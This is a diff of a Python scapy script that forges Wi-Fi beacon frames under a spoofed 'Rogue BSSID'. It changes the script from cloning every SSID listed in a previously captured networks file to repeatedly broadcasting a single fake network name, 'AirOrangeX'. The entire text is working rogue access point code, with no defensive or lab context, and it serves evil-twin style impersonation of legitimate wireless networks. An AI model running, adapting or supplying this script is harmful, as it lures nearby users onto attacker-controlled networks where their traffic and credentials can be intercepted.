@@ -1,12 +1,11 @@
-cat > scripts/rebroadcast.py << 'EOF'
 #!/usr/bin/env python3
-import os, json, time, sys
+import os, time
 from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, sendp
 
 IFACE = os.environ.get("MON_IFACE", "wlan0mon")
 CHANNEL = int(os.environ.get("CHANNEL", 6))
 ROGUE_BSSID = os.environ.get("ROGUE_BSSID", "DE:AD:BE:EF:00:01")
-NETWORKS_FILE = os.environ.get("NETWORKS_FILE", "networks_captured.json")
+ROGUE_SSID = os.environ.get("ROGUE_SSID", "AirOrangeX")
 
 def build_beacon(bssid, ssid, seq, channel):
     dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
@@ -18,31 +17,16 @@ def build_beacon(bssid, ssid, seq, channel):
     return RadioTap()/dot11/beacon/essid/rates/dsset
 
 def main():
-    if not os.path.exists(NETWORKS_FILE):
-        print(f"[!] {NETWORKS_FILE} not found. Run scan_networks.py first.")
-        sys.exit(1)
-    with open(NETWORKS_FILE) as f:
-        networks = json.load(f)
-    ssids = list(networks.values())
-    if not ssids:
-        print("[!] No SSIDs to rebroadcast.")
-        sys.exit(1)
-
-    print(f"[*] Rogue BSSID {ROGUE_BSSID} cloning {len(ssids)} SSIDs on ch {CHANNEL}")
-    for ssid in ssids:
-        print(f"      - {ssid}")
-
+    print(f"[*] Rogue BSSID {ROGUE_BSSID} broadcasting SSID '{ROGUE_SSID}' on ch {CHANNEL}")
     seq = 0
     try:
         while True:
-            for ssid in ssids:
-                pkt = build_beacon(ROGUE_BSSID, ssid, seq, CHANNEL)
-                sendp(pkt, iface=IFACE, verbose=False)
-                seq = (seq + 1) % 4096
-            time.sleep(0.2)
+            pkt = build_beacon(ROGUE_BSSID, ROGUE_SSID, seq, CHANNEL)
+            sendp(pkt, iface=IFACE, verbose=False)
+            seq = (seq + 1) % 4096
+            time.sleep(0.1)
     except KeyboardInterrupt:
         print("\n[*] Stopped.")
 
 if __name__ == "__main__":
     main()
-EOF
